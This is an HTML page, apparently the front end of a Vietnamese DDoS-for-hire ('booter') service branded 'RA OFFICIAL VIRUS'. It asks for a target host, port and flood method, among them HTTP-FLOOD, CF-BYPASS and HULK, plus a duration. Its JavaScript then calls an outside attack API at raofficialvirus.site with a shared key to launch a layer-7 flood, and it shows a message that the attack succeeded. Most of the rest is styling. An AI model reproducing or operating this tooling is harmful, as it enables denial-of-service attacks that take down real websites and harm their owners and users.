<!DOCTYPE html>
<html lang="en">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/jquery-1.10.2.min.js.download"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<style type="text/css">/* latin */ @font-face { font-family: 'Iceberg'; font-style: normal; font-weight: 400; src: local('Iceberg'), local('Iceberg-Regular'), url(https://fonts.gstatic.com/s/iceberg/v7/8QIJdijAiM7o-qnZiI8EqprnEO0.woff2) format('woff2'); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }</style>
<style type="text/css">/* latin */@font-face { font-family: 'Wallpoet'; font-style: normal; font-weight: 400; src: local('Wallpoet'), url(https://fonts.gstatic.com/s/wallpoet/v11/f0X10em2_8RnXVVdUObp58Tt868H.woff2) format('woff2'); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
<br><span class="blink_me"><font size="4" color="Red" face="Wallpoet" style="text-shadow: 5px 0px 30px red;">RA OFFICIAL VIRUS</font></center></span><br><br><center><font size="1" color="grey" face="Iceberg">
<style type="text/css"> @import url('https://fonts.googleapis.com/css?family=Nunito');@import url('https://fonts.googleapis.com/css?family=Poiret+One');body, html {height: 100%;background-repeat: no-repeat; 
background-image: linear-gradient(rgb(12, 97, 33),rgb(104, 145, 162));*/background:black;position: relative;}
particles-js{ width: 100%; height: 100%; background-size: cover; background-position: 50% 50%; position: fixed; top: 0px; z-index:1;}h1{font:1.5em Cinzel,serif;font-weight:400;letter-spacing:.35em;text-shadow:0 0 25px rgba(254,254,255,.85);width:70%} } footer { margin: 20%; }  { onmousedown:stop; animation-name: rotate ; animation-duration: 5s; animation-play-state: running; animation-timing-function: linear; animation-iteration-count: infinite; opacity: 1.0;filter: alpha(opacity=50);} img:hover {opacity: 1.0;filter: alpha(opacity=100);} @keyframes rotate{ 10% {transform:rotateY(36deg)} 20% {transform:rotateY(72deg)} 30% {transform:rotateY(108deg)} 40% {transform:rotateY(144deg)} 50% {transform:rotateY(180deg)} 60% {transform:rotateY(216deg)} 70% {transform:rotateY(252deg)} 80% {transform:rotateY(288deg)} 90% {transform:rotateY(324deg)} 100% {transform:rotateY(360deg)} }</style></head><body><body background="https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-hacked_gif.gif &#10;" title="RAOFFICIALVIRUS" bgcolor="black"><audio src="https://files.catbox.moe/mvfet1.mp3" loop="1" autoplay="1"></audio>
<style type="text/css">.blink_me{font-size:40px;-webkit-animation-name:blinker;-webkit-animation-duration:2s;-webkit-animation-timing-function:linear;-webkit-animation-iteration-count:infinite;-moz-animation-name:blinker;-moz-animation-duration:2s;-moz-animation-timing-function:linear;-moz-animation-iteration-count:infinite;animation-name:blinker;animation-duration:1s;animation-timing-function:linear;animation-iteration-count:infinite;}@-moz-keyframes blinker{0% {opacity:1.0;}50% {opacity:0.0;}100% {opacity:1.0;}}@-webkit-keyframes blinker{ 0% {opacity:1.0;}50% {opacity:0.0;}100% {opacity:1.0;}}@keyframes blinker{0% {opacity:1.0;}50% {opacity:0.0;}100% {opacity:1.0;}}</style><blink>
</b>
<br><br>
<center><br/></center><marquee scrollamount="30" behavior="alternate" width="100%"><font size="2" <font color="blue">🚀API DDOS 2024🚀</font> </marquee></font> <center><font size="1" color="lightblue"><marquee width="100%"><b><u>
</font></marquee></font></body></font>
<br><span class="blink_me"><font size="0" color="Red" face="Wallpoet" style="text-shadow: 5px 0px 27px red;"></span></center>
</html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: url('https://files.catbox.moe/lxljgv.gif') center/cover no-repeat;
            background-color: #000;
            color: #ff69b4;
            font-family: 'Arial', sans-serif;
            text-align: center;
            margin: 0;
            padding: 50px;
            overflow: hidden;
        }
        body {
    border: 3.5px solid red;
    border-radius: 5px;
    animation: rainbowBorderBody 3s linear infinite;
}

@keyframes rainbowBorderBody {
    0% {
        border-color: #ff0000;
    }
    5% {
        border-color: #ff4500; 
    }
    10% {
        border-color: #ff8c00; 
    }
    15% {
        border-color: #ffd700; 
    }
    20% {
        border-color: #ffeb3b; 
    }
    25% {
        border-color: #c6ff00; 
    }
    30% {
        border-color: #7fff00; 
    }
    35% {
        border-color: #00ff00; 
    }
    40% {
        border-color: #00ff7f; 
    }
    45% {
        border-color: #00ffbf; 
    }
    50% {
        border-color: #00ffff; 
    }
    55% {
        border-color: #007fff; 
    }
    60% {
        border-color: #0000ff; 
    }
    65% {
        border-color: #4b0082; 
    }
    70% {
        border-color: #8b00ff; 
    }
    75% {
        border-color: #ff00ff; 
    }
    80% {
        border-color: #ff00bf; 
    }
    85% {
        border-color: #ff0080; 
    }
    90% {
        border-color: #ff0040; 
    }
    95% {
        border-color: #ff6666; 
    }
    100% {
        border-color: #ff9999; 
    }
}


        h1 {
            font-size: 36px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        input {
            margin: 10px 0;
            padding: 10px;
            border: 2px solid #ff0000;
            border-radius: 5px;
            background: rgba(52, 152, 219, 0.1);
            color: #ff0000;
            font-size: 16px;
            transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
            position: relative;
        }
        input:hover,
        input:focus {
            background-color: rgba(255, 255, 255, 0.3);
            border-color: #008000;
            color: #ff0000;
        }
        input[type="submit"] {
            background-color: transparent;
            color: #ff0000;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            padding: 15px 30px;
            border: 2px solid lime;
            border-radius: 5px;
            transition: background-color 0.3s ease, border-color 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        input[type="submit"]:hover {
            background-color: transparent;
        }
        input::before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: linear-gradient(45deg, #ff0000, #ffff00, #008000);
            background-size: 400% 400%;
            border-radius: 5px;
            animation: rainbowAnimation 3s linear infinite;
            z-index: -1;
        }
        input:focus {
            animation: rainbowBorder 3s linear infinite;
        }
        #successMessage {
            display: none;
            font-size: 24px;
            color: #27ae60;
            margin-top: 20px;
            animation: sparkleAnimation 0.5s infinite alternate;
        }
        @keyframes sparkleAnimation {
            0% {
                opacity: 0;
            }

            100% {
                opacity: 1;
            }
        }
        #method {
    background: transparent; 
    border: 1.5px solid red;   
    color: red;   
    border-radius: 5px;
    font-size: 1.5em;     
}

.seekbar-container {
    position: relative;
    display: inline-block;
    width: 70%;
    margin: 0.5em; 
}
.seekbar-container::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    border: 2px solid red;
    border-radius: 5px;
    pointer-events: none;
    box-sizing: border-box;
    padding: 0.5em; 
}
#timeSlider {
    width: calc(100% - 1em); 
    margin: 0;
    padding: 0; 
    box-sizing: border-box; 
}
#timeSlider::-moz-range-thumb {
    background-color: red;
    border: 2px solid red; 
}
#timeSlider::-webkit-slider-thumb {
    background-color: red;
    border: 2px solid red; 
}
#timeSlider::before {
    content: "";
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
    background: linear-gradient(45deg, #ff0000, #ffff00, #008000);
    background-size: 400% 400%;
    border-radius: 5px;
    animation: rainbowAnimation 3s linear infinite;
    z-index: -1;
}
#countdownFrame {
  display: none;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  padding: 10px;
  background-color: pink; 
  border: 2px solid red; 
  border-radius: 5px;
  text-align: center;
  font-size: 1.5em;
  z-index: 9999;
  overflow: hidden; 
  animation: rainbowBorder 3s linear infinite; 
}

@keyframes rainbowBorder {
  0% {
    border-color: #ff0000; 
  }
  14% {
    border-color: #ff7f00; 
  }
  29% {
    border-color: #ffff00; 
  }
  43% {
    border-color: #7fff00; 
  }
  57% {
    border-color: #0000ff;
  }
  71% {
    border-color: #4b0082; 
  }
  86% {
    border-color: #8b00ff; 
  }
}

#countdownNumber {
  color: red; 
  animation: colorChangeAnimation 3s linear infinite; 
}

@keyframes colorChangeAnimation {
  0% {
    color: #8b00ff; 
  }
  14% {
    color: #4b0082; 
  }
  29% {
    color: #0000ff; 
  }
  43% {
    color: #7fff00; 
  }
  57% {
    color: #ffff00; 
  }
  71% {
    color: #ff7f00; 
  }
  86% {
    color: #ff0000; 
  }
}
.countdown-container {
    display: flex;
    justify-content: center;
    margin-top: 10px;
}

.countdown {
    font-size: 20px;
    color: red;
    margin-top: 5px;
}
#timeSlider:focus {
    animation: rainbowBorder 3s linear infinite;
}
        @keyframes rainbowAnimation {
            0%,
            100% {
                background-position: 0 0;
            }
            50% {
                background-position: 100% 100%;
            }
        }
        @keyframes rainbowBorder {
            0%,
            100% {
                border-image-slice: 1;
                border-color: #ff0000;
                color: #ff0000;
            }
            50% {
                border-image-slice: 2;
                border-color: #ffff00;
                color: #ff0000;
            }
            75% {
                border-image-slice: 3;
                border-color: #008000;
                color: #ff0000;
            }
        }
    </style>
    <title>API TEST 2024</title>
</head>
<body>
    <br>
    <form id="apiForm">
        <span style="font-size: 1.5em;">🄷🄾🅂🅃</span> <input type="text" name="host" required><br>
        <span style="font-size: 1.5em;">🄿🄾🅁🅃</span> <input type="text" name="port" required><br>
        <!-- New input for method selection -->
        <span style="font-size: 1.5em;">🄼🄴🅃🄷🄾🄳</span> <span style="font-size: 1.5em;">ㅤㅤ</span> <select name="method" id="method" style="font-size: 1.5em;">
            <option value="" disabled selected>Vui Lòng Lựa Chọn Method</option>
            <option value="TLS-SUPER">TLS-SUPER</option>
            <option value="HTTPS">HTTPS</option>
            <option value="HTTPS-LOAD">HTTPS-LOAD</option>
            <option value="HTTPS-OFFICIAL">HTTPS-OFFICIAL</option>
            <option value="HTTPS-DESTROY">HTTPS-DESTROY</option>
            <option value="HTTPS-NGOC">HTTPS-NGOC</option>
            <option value="HTTPS-CAT">HTTPS-CAT</option>
            <option value="HTTP-FLOOD">HTTP-FLOOD</option>
            <option value="HTTP-KILL">HTTP-KILL</option>
            <option value="CF-FLOOD">CF-FLOOD</option>
            <option value="CF-BYPASS">CF-BYPASS</option>
            <option value="HULK">HULK</option>
        </select>
        <span style="font-size: 1.5em;">ㅤㅤ</span>
        <span style="font-size: 1.5em;">🅃🄸🄼🄴</span>
        <div class="seekbar-container">
        <input type="range" name="time" id="timeSlider" min="1" max="120" required>
        </div>
        <span id="selectedTime">1</span> Giây<br>
        <div id="countdownFrame">
      <p>Gửi Tấn Công DDos Thành Công</p>
      <p>Host: ${host}</p>
      <p>Port: ${port}</p>
      <p>Method: ${method}</p>
      <p>Time: ${time}</p>
      <p>Vui Lòng Chờ Giây Để Tiếp Tục DDos</p>
      <span id="countdownNumber"></span>
      <p>Giây</p>
    </div>
    <input type="submit" id="submitBtn" value="sᴛᴀʀᴛ | sᴇɴᴅ">
  </form>
  <script>
    var countdownTime = 0;
    var submitButton = document.getElementById("submitBtn");
document.addEventListener("DOMContentLoaded", function () {
  var audioElement = new Audio("https://files.catbox.moe/o63wfe.mp4");
  var inputFields = document.querySelectorAll("input, select");
  inputFields.forEach(function (input) {
    input.addEventListener("click", function () {
      audioElement.play();
    });
    input.addEventListener("input", function () {
      audioElement.play();
    });
  });
});
    document.getElementById("timeSlider").addEventListener("input", function () {
      document.getElementById("selectedTime").innerText = this.value;
    });
    document.getElementById("apiForm").addEventListener("submit", function (event) {
      event.preventDefault();
      var host = document.getElementsByName('host')[0].value;
      var port = document.getElementsByName('port')[0].value;
      var method = document.getElementsByName('method')[0].value;
      var time = document.getElementById("timeSlider").value;
      if (host && port && method && time) {
        startCountdown(parseInt(time));
        sendApiRequest(host, port, method, time);
        submitButton.disabled = true;
        document.getElementById("countdownFrame").innerHTML = `<p>Gửi Tấn Công DDos Thành Công</p> <p>Host: ${host}</p> <p>Port: ${port}</p> <p>Method: ${method}</p> <p>Time: ${time}</p> <p>Vui Lòng Chờ Giây Để Tiếp Tục DDos</p> <span id="countdownNumber"></span> <p>Giây</p>`;
        
      } else {
        alert("Lỗi!! Vui Lòng Nhập Đầy Đủ Thông Tin!");
      }
    });
    function sendApiRequest(host, port, method, time) {
      var api_url = `http://raofficialvirus.site:1188/api/layer7/?key=sharefree&host=${host}&port=${port}&method=${method}&time=${time}`;
      fetch(api_url)
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
          console.log(data);
        })
        .catch(error => {
          console.error('There was a problem with the fetch operation:', error);
        });
    }
    function startCountdown(time) {
      countdownTime = time;
      document.getElementById("countdownFrame").style.display = "block";
      document.getElementById("timeSlider").style.borderColor = "red";
      document.getElementById("countdownNumber").innerText = countdownTime;
      var interval = setInterval(function () {
        countdownTime--;
        document.getElementById("countdownNumber").innerText = countdownTime;
        if (countdownTime <= 0) {
          clearInterval(interval);
          document.getElementById("countdownFrame").style.display = "none";
          document.getElementById("timeSlider").style.borderColor = "#ff0000";
          submitButton.disabled = false;
        }
      }, 1000);
    }
        function hideNotification(notificationId) {
            document.getElementById(notificationId).style.display = "none";
        }
    </script>
    <br><span class="blink_me"><font size="2" color="Red" face="Wallpoet" style="text-shadow: 5px 0px 27px red;">Powered By Ra Official Virus<br><a href="https://raofficialvirus.site/">COPYRIGHT© 2024<br></span></center>
</body>
</html>



